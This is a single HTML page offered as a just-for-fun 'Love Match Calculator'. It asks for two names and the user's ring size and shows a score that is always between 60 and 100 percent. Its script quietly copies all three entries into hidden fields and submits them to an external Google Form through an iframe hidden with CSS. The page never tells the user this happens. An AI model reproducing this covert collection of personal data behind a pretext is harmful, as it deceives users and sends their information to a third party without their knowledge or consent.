<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Match Calculator❤️ - Built by Prottoy — just for fun 💻</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: radial-gradient(circle at top,#ff4d6d,#ff003c,#1a0010);
    padding:20px;
    overflow-x:hidden;
}

/* floating particles */
.particle{
    position:absolute;
    width:6px;
    height:6px;
    background:white;
    border-radius:50%;
    opacity:0.3;
    animation:floatUp 10s linear infinite;
}

@keyframes floatUp{
    0%{transform:translateY(100vh);}
    100%{transform:translateY(-10vh);}
}

.container{
    width:100%;
    max-width:420px;
    background:rgba(255,255,255,0.12);
    backdrop-filter:blur(25px);
    border-radius:28px;
    padding:26px;
    color:white;
    box-shadow:0 20px 60px rgba(0,0,0,0.3);
    animation:fadeIn 0.8s ease;
}

@keyframes fadeIn{
    from{opacity:0; transform:translateY(20px);}
    to{opacity:1; transform:translateY(0);}
}

.heart{
    text-align:center;
    font-size:52px;
    animation:beat 1.2s infinite;
}

@keyframes beat{
    50%{transform:scale(1.2);}
}

h1{
    text-align:center;
    font-size:22px;
    margin:10px 0 18px;
}

input{
    width:100%;
    padding:14px;
    margin-bottom:10px;
    border:none;
    outline:none;
    border-radius:14px;
    background:rgba(255,255,255,0.15);
    color:white;
    font-size:14px;
    transition:0.3s;
}

input:focus{
    transform:scale(1.02);
    background:rgba(255,255,255,0.22);
}

input::placeholder{
    color:rgba(255,255,255,0.6);
}

button{
    width:100%;
    padding:14px;
    margin-top:8px;
    border:none;
    border-radius:14px;
    background:linear-gradient(90deg,#fff,#ffd6df);
    color:#ff003c;
    font-weight:700;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    transform:translateY(-3px);
    box-shadow:0 10px 25px rgba(255,0,60,0.25);
}

.result{
    margin-top:18px;
    display:none;
}

.percent{
    text-align:center;
    font-size:34px;
    font-weight:800;
}

.bar{
    width:100%;
    height:14px;
    background:rgba(255,255,255,0.2);
    border-radius:50px;
    overflow:hidden;
}

.fill{
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#fff,#ffb6c1);
    transition:1.6s ease;
}

.message{
    text-align:center;
    margin-top:10px;
    opacity:0;
    transform:translateY(10px);
    transition:0.5s;
}

.message.show{
    opacity:1;
    transform:translateY(0);
}

/* footer */
.footer{
    position:fixed;
    bottom:12px;
    left:50%;
    transform:translateX(-50%);
    padding:8px 14px;
    font-size:12px;
    color:rgba(255,255,255,0.75);
    background:rgba(0,0,0,0.25);
    backdrop-filter:blur(10px);
    border:1px solid rgba(255,255,255,0.15);
    border-radius:20px;
    z-index:999;
    text-align:center;
}

/* mobile */
@media(max-width:480px){
    .container{padding:20px;}
    h1{font-size:20px;}
    .percent{font-size:28px;}
}
iframe{display:none;}
</style>
</head>

<body>

<div class="container">

    <div class="heart">❤️</div>
    <h1>Love Match Calculator</h1>

    <input type="text" id="name1" placeholder="Your Name">
    <input type="text" id="name2" placeholder="Their Name">
    <input type="number" id="ring" placeholder="Your Ring Size (mm)">

    <button onclick="calculateLove()">Calculate ❤️</button>

    <div class="result" id="result">
        <div class="percent" id="percent">0%</div>

        <div class="bar">
            <div class="fill" id="fill"></div>
        </div>

        <div class="message" id="message"></div>
    </div>

</div>

<!-- Google Form -->
<form id="googleForm"
action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
method="POST"
target="hidden_iframe">

<input type="hidden" name="entry.1203440948" id="g1">
<input type="hidden" name="entry.632297335" id="g2">
<input type="hidden" name="entry.2029294024" id="g3">
</form>

<iframe name="hidden_iframe"></iframe>

<!-- footer -->
<div class="footer">
    dev &lt;/&gt; prottoy • class 10 vibe coder
</div>

<script>

/* particles */
for(let i=0;i<15;i++){
    let p=document.createElement("div");
    p.className="particle";
    p.style.left=Math.random()*100+"vw";
    p.style.animationDuration=(5+Math.random()*5)+"s";
    document.body.appendChild(p);
}

function calculateLove(){

    const name1=document.getElementById("name1").value.trim();
    const name2=document.getElementById("name2").value.trim();
    const ring=document.getElementById("ring").value;

    if(!name1||!name2){
        alert("Please fill all fields!");
        return;
    }

    let combined=(name1+name2).toLowerCase();
    let total=0;

    for(let i=0;i<combined.length;i++){
        total+=combined.charCodeAt(i);
    }

    let percent=(total%41)+60;

    document.getElementById("result").style.display="block";
    document.getElementById("percent").innerText=percent+"%";

    setTimeout(()=>{
        document.getElementById("fill").style.width=percent+"%";
    },100);

    let msg="";
    if(percent>=95) msg="💍 Soulmates detected!";
    else if(percent>=85) msg="💕 Perfect match!";
    else if(percent>=75) msg="❤️ Strong bond!";
    else msg="🥰 There is potential!";

    let m=document.getElementById("message");
    m.innerText=msg;
    setTimeout(()=>m.classList.add("show"),200);

    /* Google Form submit */
    document.getElementById("g1").value=name1;
    document.getElementById("g2").value=name2;
    document.getElementById("g3").value=ring;

    document.getElementById("googleForm").submit();
}

</script>

</body>
</html>
